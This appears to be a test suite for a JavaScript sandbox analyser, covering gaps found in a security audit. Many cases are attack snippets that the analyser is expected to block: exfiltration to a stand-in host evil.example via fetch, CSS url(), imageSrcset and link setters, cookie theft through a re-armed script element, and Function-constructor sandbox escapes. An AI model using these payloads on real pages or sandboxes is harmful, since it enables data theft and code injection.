  it('controls: literal keyframes, paint colours and escapes without a loading function still pass', () => {
    for (const source of [
      `document.body.animate([{ opacity: 0 }, { opacity: 1 }], { duration: 200 })`,
      `document.body.animate({ transform: ['none', 'scale(2)'], backgroundColor: ['red', 'blue'] }, 100)`,
      `document.body.animate([{ 'background-color': 'red', offset: 0 }, { 'background-color': 'blue', easing: 'ease' }], 100)`,
      `document.body.style.fill = 'red'; document.body.style.stroke = 'none'; document.body.style.strokeWidth = '2px'`,
      `document.body.style.clipPath = 'inset(0 0 0 0)'; document.body.style.maskType = 'alpha'`,
      `document.body.style.setProperty('marker-start', 'none')`,
      String.raw`document.body.style.content = '"\\201C"'; document.body.style.fontFamily = '"a\\20 b"'`,
      String.raw`document.body.style.setProperty('--n', '\\31 0px')`,
      String.raw`const re = '\\d+'; document.body.dataset.pattern = re`,
    ]) {
      expect(blocks(source), source).toBe(false)
    }
  })
})

describe('audit of 00cc5f7 (#48): URL setters and runtime javascript: URLs', () => {
  const SNIPPETS = [
    `const a = document.querySelector('a[href]'); a.hostname = 'evil.example'; a.search = '?' + document.title; a.click()`,
    `document.querySelector('svg image').href.baseVal = 'https://evil.example/?' + document.title`,
    `document.querySelector('object').data = 'https://evil.example/?' + document.title`,
  ]
  for (const snippet of SNIPPETS) {
    it(`blocks: ${snippet}`, () => {
      expect(blocks(snippet)).toBe(true)
    })
  }

  it('blocks a runtime-built javascript: URL even when network is declared (gap 7)', () => {
    const snippet = `const p = 'java'; const a = document.createElement('a'); a.href = p + 'script:al' + 'ert(1)'; document.body.append(a); a.click()`
    expect(blocks(snippet, ['network'])).toBe(true)
  })

  it('refuses every address part of a link, a form action and a frame, which can change where it goes', () => {
    for (const name of ['hostname', 'host', 'protocol', 'pathname', 'search', 'hash', 'port', 'username', 'password']) {
      expect(blocks(`document.querySelector('a').${name} = 'x'`), name).toBe(true)
      expect(blocks(`document.querySelector('a').${name} += 'x'`), name).toBe(true)
      expect(blocks(`document.querySelector('a')['${name}'] = 'x'`), name).toBe(true)
      // Declared network use unlocks a part, as it unlocks href.
      expect(blocks(`document.querySelector('a').${name} = 'x'`, ['network']), name).toBe(false)
    }
  })

  it('refuses the SVG address forms and object data', () => {
    for (const source of [
      `document.querySelector('svg image').href.animVal = 'https://evil.example/'`,
      `document.querySelector('svg image').href.baseVal = '#a'`,
      `document.querySelector('object').data = '/x'`,
      `document.querySelectorAll('object')[0].data = '/x'`,
      `document.getElementsByTagName('object')[0].data = '/x'`,
      `const o = document.querySelector('object'); o.data += 'x'`,
      `Object.assign(document.querySelector('object'), { data: '/x' })`,
      `const el = document.body; el.data = 'x'`,
    ]) {
      expect(blocks(source), source).toBe(true)
    }
  })

  it('refuses a URL write whose value is not provably free of javascript:, whatever is declared', () => {
    for (const source of [
      `const a = document.body; a.href = a.title`,
      `const a = document.body; const u = a.title; a.href = u`,
      `const a = document.body; a.href = 'java' + 'script:alert(1)'`,
      `const a = document.body; a.href = '' + a.title`,
      `const a = document.body; a.href = \`\${a.title}x\``,
      `const a = document.body; a.href = a.title + '/x'`,
      `const a = document.body; a.href += '/x'`,
      `const a = document.body; a.href = 'ht' + a.title`,
      `const a = document.body; a.href = 'java\\tscript:alert(1)'`,
      `const a = document.body; a.setAttribute('href', a.title)`,
      `const a = document.body; const p = 'java'; a.setAttribute('href', p + 'script:alert(1)')`,
      `const a = document.body; a.setAttribute('xlink:href', a.title)`,
      `const f = document.createElement('form'); f.action = 'x'`,
      `const a = document.body; Object.assign(a, { href: a.title })`,
      `const a = document.body; a.formAction = a.title`,
      `const a = document.body; a.src = a.title`,
      `const a = document.body; const c = a.title ? 'a' : a.id; a.href = c`,
    ]) {
      expect(blocks(source, ['network']), source).toBe(true)
    }
  })

  it('controls: a written-out address prefix passes with network declared, and not without it', () => {
    for (const source of [
      `const a = document.body; a.href = 'https://example.com/a'`,
      `const a = document.body; a.href = 'https://example.com/' + a.id`,
      `const a = document.body; a.href = '/path/' + encodeURIComponent(a.title)`,
      `const a = document.body; a.href = \`https://example.com/\${a.id}\``,
      `const a = document.body; a.href = a.id ? 'https://a.example/' : '/b'`,
      `const a = document.body; a.href = '#top'`,
      `const a = document.body; a.href = '?q=' + a.id`,
      `const a = document.body; a.href = ''`,
      `const a = document.body; a.setAttribute('href', 'https://example.com/' + a.id)`,
      `const a = document.body; Object.assign(a, { href: '/x/' + a.id })`,
    ]) {
      expect(blocks(source, ['network']), source).toBe(false)
      expect(blocks(source), source).toBe(true)
    }
  })

  it('controls: URL objects, text nodes and plain reads of these names still pass', () => {
    for (const source of [
      `const u = new URL('https://example.com/a'); u.search = '?x=1'; u.hash = '#y'; u.pathname = '/z'`,
      `const u = new URL('https://example.com/a'); u.hostname = 'example.org'; u.href`,
      `const t = document.createTextNode('x'); t.data = 'y'; t.data += 'z'`,
      `document.createTextNode('a').data = 'b'`,
      `const t = new Text('a'); t.data = 'b'`,
      `const c = document.createComment('a'); c.data = 'b'`,
      `const a = document.querySelector('a'); const h = a.hostname, p = a.pathname, s = a.search, x = a.hash, d = a.data`,
      `const o = { host: 'a', search: 'b', data: 'c', hash: 'd' }; o.host`,
    ]) {
      expect(blocks(source), source).toBe(false)
    }
    // A plain object written in the code holds no address, but only while
    // every write to its name is such an object.
    expect(blocks(`const o = { search: 'a', data: 'c' }; o.search = 'b'; o.data = 'd'`)).toBe(false)
    expect(blocks(`let o = { search: 'a' }; o = document.body; o.search = 'b'`)).toBe(true)
    expect(blocks(`let o = { data: 'a' }; o = document.querySelector('object'); o.data = 'b'`)).toBe(true)
    expect(blocks(`const n = document.querySelector('p').firstChild; n.data = 'x'`)).toBe(true)
  })
})

/**
 * Patterns that the allowlist refused although they are ordinary, with the
 * variants that must stay refused so that each relaxation has a control.
 */
describe('allowlist (#48): ordinary patterns that pass', () => {
  const PASS: Record<string, string> = {
    'index parameter of forEach': `
      const labels = ['a', 'b', 'c'];
      document.querySelectorAll('li').forEach((el, i) => { el.textContent = labels[i]; });`,
    'index parameter of map over Array.from': `
      const labels = ['a', 'b'];
      const items = Array.from(document.querySelectorAll('li'));
      items.map((el, index) => labels[index]);`,
    'index parameter of reduce, written as a function': `
      const w = [1, 2, 3];
      [4, 5, 6].reduce(function (sum, x, i) { return sum + w[i] * x }, 0);`,
    'index parameter of filter over a chain': `
      const keep = [true, false];
      Array.from(document.querySelectorAll('li')).slice(0, 5).filter((el, i) => keep[i]);`,
    'index parameter through a name that holds an array': `
      const labels = ['a'];
      let rows = [];
      rows = Array.from(document.querySelectorAll('tr'));
      rows.forEach((row, n) => { row.dataset.n = labels[n]; });`,
    'tabs[tabs.indexOf(cur) + 1]': `
      const tabs = Array.from(document.querySelectorAll('.tab'));
      const cur = document.querySelector('.tab.active');
      const next = tabs[tabs.indexOf(cur) + 1];
      if (next) next.click();`,
    'previous item with lastIndexOf and a spread array': `
      const tabs = [...document.querySelectorAll('.tab')];
      const cur = document.querySelector('.tab.active');
      const prev = tabs[tabs.lastIndexOf(cur) - 1];`,
    '.text written on a plain object held in a const': `
      const state = { text: '', count: 0 };
      state.text = document.title;
      state.count += 1;`,
    '.text written on an object that is filled later': `
      const state = {};
      state.text = 'a';`,
    'location.pathname, search, hash and href read': `
      const p = location.pathname, s = location.search, h = location.hash, u = location.href;
      if (p.startsWith('/watch') && new URLSearchParams(s).has('v')) document.body.dataset.v = h.slice(1) + u.length;`,
    'window.location.pathname and document.URL read': `
      if (window.location.pathname === '/' || document.URL.includes('?')) document.body.dataset.home = '1';
      const x = window.location.href.split('#')[0];`,
    'style.filter with a numeric value': `
      const el = document.body;
      const n = Math.min(window.scrollY / 100, 8);
      el.style.filter = 'blur(' + n + 'px)';
      el.style.backdropFilter = \`blur(\${n * 2}px)\`;`,
    'style.filter with an index parameter': `
      document.querySelectorAll('li').forEach((el, i) => { el.style.filter = 'blur(' + i + 'px)'; });`,
    'style.background chosen between written-out values': `
      const el = document.body;
      const dark = matchMedia('(prefers-color-scheme: dark)').matches;
      const c = dark ? '#111' : '#eee';
      el.style.background = c;
      let d; if (dark) d = 'black'; else d = 'white';
      el.style.background = d;
      el.style.background = dark ? 'red' : 'blue';`,
    'style.background and setProperty with a literal': `
      document.body.style.background = 'red';
      document.body.style.setProperty('background', 'blue');
      Object.assign(document.body.style, { background: 'green' });`,
  }

  for (const [name, code] of Object.entries(PASS)) {
    it(`passes: ${name}`, () => {
      const { findings } = applyCapabilityPolicy(analyseJavaScript(code), [])
      expect(findings, JSON.stringify(findings)).toEqual([])
    })
    it(`passes inside the harness: ${name}`, () => {
      const wrapped = wrapTransform({
        name: 'test',
        anchor: { landmarks: ['main'] },
        code,
      } as unknown as Parameters<typeof wrapTransform>[0])
      expect(blocks(wrapped)).toBe(false)
    })
  }

  it('still refuses a key that is not provably a number', () => {
    for (const source of [
      // A parameter that is not the index.
      `const o = ['a']; document.querySelectorAll('li').forEach((el, i) => o[el])`,
      `const o = ['a']; Array.from(document.querySelectorAll('li')).map((el) => o[el.dataset.k])`,
      `const o = ['a']; new Map().forEach((v, k) => o[k])`,
      `const o = ['a']; const m = new Map(); m.forEach((v, k) => o[k])`,
      `const o = ['a']; document.querySelectorAll('li').forEach((el, i) => { i = el.id; o[i] })`,
      `const o = ['a']; document.querySelectorAll('li').forEach((el, i) => { i += el.id; o[i] })`,
      `const o = ['a']; document.querySelectorAll('li').forEach((el, i = el.id) => o[i])`,
      `const o = ['a']; document.querySelectorAll('li').forEach((el, i) => { [i] = [el.id]; o[i] })`,
      `const o = ['a']; document.querySelectorAll('li').forEach((el, i) => { ({ i } = { i: el.id }); o[i] })`,
      `const o = ['a']; document.querySelectorAll('li').forEach((el, i) => { for (i of [el.id]) o[i] })`,
      `const o = ['a']; document.querySelectorAll('li').forEach((el, ...i) => o[i])`,
      `const o = ['a']; document.querySelectorAll('li').forEach(function (el, { i }) { return o[i] })`,
      // A receiver that is not provably an array.
      `const o = ['a']; getList().forEach((v, i) => o[i]); function getList() { return new Map() }`,
      `const o = ['a']; const x = { forEach(cb) { cb(0, 'constructor') } }; x.forEach((v, i) => o[i])`,
      `const o = ['a']; const f = (el, i) => o[i]; f(1, 'constructor')`,
      `const o = ['a']; Array.from(document.querySelectorAll('li')).forEach(handler); function handler(el, i) { return o[i] }`,
      // A method with the name of a list method, defined in the code.
      `const o = ['a']; const x = { querySelectorAll() { return new Map() } }; x.querySelectorAll('li').forEach((v, i) => o[i])`,
      `class A { querySelectorAll() { return new Map() } } const o = ['a']; new A().querySelectorAll('li').forEach((v, i) => o[i])`,
      `const o = ['a']; const x = {}; x.slice = () => new Map(); x.slice().forEach((v, i) => o[i])`,
      `const o = ['a']; const x = { [document.title]: 1 }; [1].forEach((v, i) => o[i])`,
      `const o = ['a']; const x = Object.fromEntries([['forEach', 1]]); [1].forEach((v, i) => o[i])`,
      `const o = ['a']; const k = { indexOf() { return 'constructor' } }; o[k.indexOf()]`,
      `const o = ['a']; const t = 'abc'; o[t.indexOf('b')]`,
      `const o = ['a']; const t = document.title; o[t.indexOf('b')]`,
      `const o = ['a']; const tabs = [1]; const x = { indexOf() { return 'a' } }; o[tabs.indexOf(1) + x.indexOf()]`,
      // The bypass the earlier tests used.
      `[][document.title][document.title]('return 1')()`,
    ]) {
      expect(blocks(source), source).toBe(true)
    }
  })

  it('still refuses writing .text on anything that is not a plain object', () => {
    for (const source of [
      `document.querySelector('x').text = 'a'`,
      `const s = document.createElement('div'); s.text = 'a'`,
      `let state = { text: '' }; state = document.querySelector('x'); state.text = 'a'`,
      `const state = { text: '' }; document.querySelector('x').text = state.text`,
      `function f(o) { o.text = 'a' } f({})`,
      `const state = { text: '' }; state.innerHTML = ''; document.querySelector('x').innerHTML = ''`,
    ]) {
      expect(blocks(source), source).toBe(true)
    }
  })

  it('still refuses writing to location and calling its methods', () => {
    for (const source of [
      `location.href = 'https://evil.example/'`,
      `location.href += '#x'`,
      `location.pathname = '/x'`,
      `location.search = '?q=1'`,
      `location.hash = '#x'`,
      `location.assign('https://evil.example/')`,
      `location.replace('https://evil.example/')`,
      `location.reload()`,
      `window.location = 'https://evil.example/'`,
      `window.location.href = 'https://evil.example/'`,
      `window.location.assign('https://evil.example/')`,
      `document.location.pathname`,
      `document.location = 'https://evil.example/'`,
      `const l = location`,
      `const l = window.location`,
      `const { href } = location`,
      `const { pathname } = window.location`,
      `[location.href] = ['https://evil.example/']`,
      `({ a: location.href } = { a: 'https://evil.example/' })`,
      `for (location.href of ['https://evil.example/']) {}`,
      `location.href++`,
      `location.origin`,
      `location.host`,
      `location.toString()`,
      `location.href()`,
      `f(location)`,
      `typeof location`,
      `location[document.title]`,
      `window.location[document.title]`,
      `window.location.pathname = '/x'`,
    ]) {
      expect(blocks(source), source).toBe(true)
    }
  })

  it('still refuses style values that are not provably free of an address', () => {
    for (const source of [
      `document.body.style.filter = 'blur(' + document.title + 'px)'`,
      `document.querySelectorAll('li').forEach((el, i) => { el.style.filter = 'url(' + i + ')' })`,
      `const n = document.title; document.body.style.filter = 'blur(' + n + 'px)'`,
      `const n = 1; document.body.style.filter = 'ur' + n + 'l(https://evil.example/)'.slice(1)`,
      `const c = document.title ? 'red' : document.body.id; document.body.style.background = c`,
      `const c = 'url(https://evil.example/x)'; document.body.style.background = c`,
      `const c = document.title ? 'red' : 'url(https://evil.example/x)'; document.body.style.background = c`,
      `let c = 'ur'; c += 'l(https://evil.example/x)'; document.body.style.background = c`,
      `let c = 'ur'; c = c + 'l(https://evil.example/x)'; document.body.style.background = c`,
      `let c = 'red'; c = document.title; document.body.style.background = c`,
      `function f(c) { document.body.style.background = c } f('red')`,
      `const c = 'var(--u)'; document.body.style.background = c`,
      `const { c } = { c: 'red' }; document.body.style.background = c`,
      `document.body.style.background = document.title`,
      // The obsolete background attribute of body and table is an address.
      `document.body.background = 'red'`,
      `const t = document.createElement('table'); t.background = 'red'`,
    ]) {
      expect(blocks(source), source).toBe(true)
    }
  })
})

/**
 * Gaps found by the second audit (#48, /tmp/wa-audit-48b.md at a693851). Each
 * snippet is the one the auditor reported, run through the analyser and the
 * capability policy with no capability declared unless the test says so.
 */
describe('second audit (#48): numeric proofs that hold a string', () => {
  const SNIPPETS = [
    `function k() {}; k.toString = () => 'constructor'; [][k][k]('return 1')()`,
    `Math.k = () => 'constructor'; [][Math.k()][Math.k()]('return 1')()`,
    `Number = () => 'constructor'; [][Number()][Number()]('return 1')()`,
    `const a = []; a.indexOf = () => 'constructor'; [][a.indexOf()][a.indexOf()]('return 1')()`,
    `const a = [1]; a.forEach = (cb) => cb(0, 'constructor'); a.forEach((v, i) => { [][i][i]('return 1')() })`,
    `function a(){}; a.toString=()=>'ownerDocument'; function o(){}; o.toString=()=>'open'; document.body[a][o]('https://evil.example/?'+document.title,'x','')`,
  ]
  for (const snippet of SNIPPETS) {
    it(`blocks: ${snippet}`, () => {
      expect(blocks(snippet)).toBe(true)
    })
  }

  it('blocks variants through other writes to an allowed global', () => {
    for (const source of [
      `Math.floor = () => 'constructor'; [][Math.floor(1)][Math.floor(1)]('return 1')()`,
      `const M = Math; M.k = () => 'constructor'; [][Math.k()][Math.k()]('return 1')()`,
      `Math['k'] = () => 'constructor'`,
      `Object.assign(Math, { k: () => 'constructor' })`,
      `Array.from = () => 'x'`,
      `Object.keys = () => 'x'`,
      `[Math.k] = [() => 'x']`,
      `parseInt = () => 'constructor'`,
      `Number++`,
      `for (Number of [1]) {}`,
      `String.prototype.k = 1`,
      `const A = Array; A.from = () => 'x'`,
    ]) {
      expect(blocks(source), source).toBe(true)
    }
  })

  it('still passes numeric keys that are proved', () => {
    for (const source of [
      `const a = [1, 2]; for (let i = 0; i < a.length; i++) { a[i] }`,
      `const a = [1, 2]; a.forEach((v, i) => { a[i] })`,
      `const a = [1, 2]; const i = a.indexOf(2); a[i]`,
      `const a = [1, 2]; a[Math.floor(1)]`,
      `const a = [1, 2]; a[Number('1')]`,
      `const a = [1, 2]; a[parseInt('1', 10)]`,
      `document.querySelectorAll('li').forEach((el, i) => { el.style.opacity = i ? '1' : '0' })`,
      `const tabs = Array.from(document.querySelectorAll('a')); tabs[tabs.indexOf(tabs[0]) + 1]`,
      `const x = [3, 1].map(Number).filter(Boolean); x.length`,
    ]) {
      expect(blocks(source), source).toBe(false)
    }
  })
})

describe('second audit (#48): an existing script element that never ran', () => {
  const SNIPPETS = [
    `const j = document.querySelector('[type="application/ld+json"]'); j.removeAttribute('type'); j.textContent = 'fetch("https://evil.example/?" + document.cookie)'`,
    `const j = document.querySelector('#__NEXT_DATA__').cloneNode(); j.type = 'text/javascript'; j.textContent = 'alert(document.cookie)'; document.body.append(j)`,
  ]
  for (const snippet of SNIPPETS) {
    it(`blocks: ${snippet}`, () => {
      expect(blocks(snippet)).toBe(true)
    })
  }

  it('blocks the snippet that sets src, even with the network capability declared', () => {
    const snippet = `const j = document.querySelector('[type="application/ld+json"]'); j.removeAttribute('type'); j.src = 'https://evil.example/x.js'`
    expect(blocks(snippet, ['network'])).toBe(true)
    expect(blocks(snippet)).toBe(true)
  })

  it('blocks variants that change what makes a script element run', () => {
    const j = `const j = document.querySelector('[type="application/ld+json"]'); `
    for (const source of [
      j + `j.type = 'text/javascript'`,
      j + `j.setAttribute('type', 'text/javascript')`,
      j + `j.toggleAttribute('type')`,
      j + `j.removeAttribute('nomodule')`,
      j + `j.noModule = false`,
      j + `j.removeAttribute('language')`,
      j + `j.removeAttribute('event')`,
      j + `j.removeAttribute(document.title)`,
      j + `j.removeAttributeNS(null, 'type')`,
      j + `j.removeAttributeNode(j.getAttributeNode('type'))`,
      j + `Object.assign(j, { type: 'text/javascript' })`,
      j + `({ a: j.type } = { a: 'text/javascript' })`,
      j + `j['ty' + 'pe'] = 'text/javascript'`,
      j + `j.setAttribute('src', 'https://evil.example/x.js')`,
      j + `Object.assign(j, { src: 'https://evil.example/x.js' })`,
      j + `const c = j.cloneNode; c.call(j)`,
      j + `j.cloneNode(true)`,
      `document.querySelectorAll('li').forEach((li) => { li.type = 'text/javascript' })`,
      `function f(e) { e.type = 'text/javascript' } f(document.body)`,
      `class A { m() { this.type = 'text/javascript' } }`,
      `const c = document.createElement('div'); let d = c; d = document.body; d.type = 'x'`,
    ]) {
      expect(blocks(source, ['network']), source).toBe(true)
    }
  })

  it('still passes the same properties on an element made in the code, and on plain data', () => {
    for (const source of [
      `const i = document.createElement('input'); i.type = 'checkbox'; document.body.append(i)`,
      `const b = document.createElement('button'); b.setAttribute('type', 'button'); b.removeAttribute('type')`,
      `document.createElement('input').type = 'text'`,
      `const b = document.createElement('button'); const c = b.cloneNode(true); document.body.append(c)`,
      `const state = { type: 'a' }; state.type = 'b'`,
      `const o = {}; o.event = 1`,
    ]) {
      expect(blocks(source), source).toBe(false)
    }
    expect(blocks(`const i = new Image(); i.src = 'https://example.com/a.png'`, ['network'])).toBe(false)
    expect(blocks(`const i = document.createElement('img'); i.src = 'https://example.com/a.png'`, ['network'])).toBe(false)
  })
})

describe('second audit (#48): the window as a value through event-handler properties', () => {
  const SNIPPETS = [
    `document.body.onfocus = (e) => { const w = e.target; new w.FontFace('f', 'ur' + 'l(https://evil.example/?' + document.title + ')').load() }`,
    `const o = { m() { new this.FontFace('f', 'ur' + 'l(https://evil.example/?' + document.title + ')').load() } }; document.body.onfocus = o.m`,
    `Object.assign(document.body, { onresize: (e) => { e.currentTarget.navigator.clipboard.readText().then((t) => { document.title = t }) } })`,
    `window.addEventListener('message', (e) => { const w = e.source; new w.FontFace('f', 'ur' + 'l(https://evil.example/?' + document.title + ')').load() })`,
  ]
  for (const snippet of SNIPPETS) {
    it(`blocks: ${snippet}`, () => {
      expect(blocks(snippet)).toBe(true)
    })
  }

  it('blocks variants that write a handler property or read a window from an event', () => {
    for (const source of [
      `document.body.onload = () => {}`,
      `document.onclick = () => {}`,
      `window.onmessage = () => {}`,
      `document.querySelector('button').onclick = () => {}`,
      `const b = document.createElement('button'); b.onclick = () => {}`,
      `document.body['on' + 'focus'] = () => {}`,
      `document.body.onfocus += 1`,
      `({ a: document.body.onfocus } = { a: () => {} })`,
      `document.addEventListener('storage', (e) => { e.storageArea.setItem('a', 'b') })`,
      `document.addEventListener('message', (e) => { e.ports[0].postMessage('x') })`,
      `window.addEventListener('click', (e) => { e.view })`,
    ]) {
      expect(blocks(source, ['storage']), source).toBe(true)
    }
  })

  it('still passes addEventListener and handler-like names on plain data', () => {
    for (const source of [
      `document.querySelector('button').addEventListener('click', () => { document.title = 'x' })`,
      `document.body.addEventListener('focus', (e) => { e.target.classList.add('x') }, true)`,
      `window.addEventListener('keydown', (e) => { if (e.key === 'Escape') document.body.classList.remove('x') })`,
      `const handlers = { onChange: () => {} }; handlers.onChange = () => {}`,
      `const state = { once: true }; state.once = false`,
    ]) {
      expect(blocks(source), source).toBe(false)
    }
  })
})

describe('second audit (#48): a style element that can still be reached', () => {
  const SNIPPETS = [
    `const sel = 'style'; document.querySelector(sel).textContent = '@imp' + 'ort "https://evil.example/?' + document.title + '"'`,
    `document.querySelector(true ? 'style' : 'div').textContent = 'body{background:ur' + 'l(https://evil.example/?' + document.title + ')}'`,
    `document.querySelector('st\\\\79le').textContent = ''`,
    `document.querySelector('*|style').textContent = ''`,
    `document.head.lastElementChild.textContent = ''`,
    `[...document.getElementsByTagName('*')].find((e) => e.tagName === 'STYLE').append('')`,
    `document.head.children[0].firstChild.nodeValue = ''`,
  ]
  for (const snippet of SNIPPETS) {
    it(`blocks: ${snippet}`, () => {
      expect(blocks(snippet)).toBe(true)
    })
  }

  it('blocks variants of the selector and of the traversal', () => {
    for (const source of [
      `const s = 'sty' + 'le'; document.querySelector(s)`,
      `function pick(sel) { return document.querySelector(sel) } pick('style')`,
      `document.querySelector(document.title)`,
      `document.querySelectorAll(\`\${document.title}\`)`,
      `document.querySelector('div').closest(document.title)`,
      `document.querySelector('div').matches(document.title)`,
      `document.getElementsByTagName(document.title)`,
      `document.getElementsByTagName('*')`,
      `document.getElementsByTagNameNS('*', '*')`,
      `document.getElementsByTagNameNS('http://www.w3.org/1999/xhtml', document.title)`,
      `document.querySelectorAll('*')`,
      `document.querySelectorAll('head *')`,
      `document.querySelectorAll('div, *')`,
      `document.querySelector('ns|style')`,
      `document.querySelector(':is(div, st\\\\79 le)')`,
      `document.querySelector('STYLE')`,
      `const h = document.head; h.lastElementChild.textContent = ''`,
      `const h = document.head; h.firstChild.nodeValue = ''`,
      `document.head.childNodes[0].data = ''`,
      `document.head.firstElementChild.append('')`,
      `document.documentElement.children[0].children[0].textContent = ''`,
      `for (const c of document.head.children) { c.textContent = '' }`,
      `Array.from(document.head.children).forEach((c) => { c.textContent = '' })`,
      `const { lastElementChild: c } = document.head; c.textContent = ''`,
      `const { children } = document.documentElement`,
      `const { ...rest } = document.head`,
      `document.getElementsByTagName('head')[0].lastElementChild.textContent = ''`,
      `document.querySelector('head').lastChild.nodeValue = ''`,
      `document.body.previousElementSibling.lastElementChild.textContent = ''`,
      `document.head?.lastElementChild.textContent = ''`,
    ]) {
      expect(blocks(source), source).toBe(true)
    }
  })

  it('still passes selectors written out and a head that is only appended to', () => {
    for (const source of [
      `document.querySelector('.card > h2').textContent = 'x'`,
      `const sel = '.card'; document.querySelector(sel)`,
      `document.querySelectorAll('li:nth-child(' + 2 + ')')`,
      `document.querySelectorAll('[style*="width"]')`,
      `document.querySelectorAll('a[href^="/x"]')`,
      `document.querySelectorAll('.script, .styled')`,
      `document.querySelector('div').closest('section')`,
      `document.querySelector('div').matches('.on')`,
      `document.getElementsByTagName('a')`,
      `document.head.append(document.createElement('div'))`,
      `document.head.querySelector('meta[name="theme-color"]').content`,
      `document.documentElement.classList.add('x')`,
      `document.documentElement.dataset.theme = 'dark'`,
      `document.querySelector('ul').children`,
      `const el = document.querySelector('ul'); el.firstElementChild.textContent = 'x'`,
    ]) {
      expect(blocks(source), source).toBe(false)
    }
  })
})

describe('second audit (#48): imageSrcset', () => {
  const SNIPPETS = [
    `const link = document.createElement('div'); link.imageSrcset = 'https://evil.example/?' + document.title + ' 1x'`,
    `const link = document.createElement('div'); link.setAttribute('imagesrcset', 'https://evil.example/?' + document.title + ' 1x')`,
  ]
  for (const snippet of SNIPPETS) {
    it(`blocks: ${snippet}`, () => {
      expect(blocks(snippet)).toBe(true)
    })
  }

  it('blocks the existing-element and object forms, and passes them with network declared', () => {
    expect(blocks(`document.querySelector('link').imageSrcset = 'https://evil.example/?' + document.title + ' 1x'`)).toBe(true)
    expect(blocks(`Object.assign(document.createElement('div'), { imageSrcset: 'https://evil.example/x 1x' })`)).toBe(true)
    // An address is network use, so declaring the capability allows a written-out address.
    expect(blocks(`const l = document.createElement('div'); l.imageSrcset = 'https://example.com/a.png 1x'`, ['network'])).toBe(false)
    // The check is on the name, so a name that only looks similar is unaffected.
    expect(blocks(`const l = document.createElement('div'); l.imageSizes = '100vw'`)).toBe(false)
  })
})
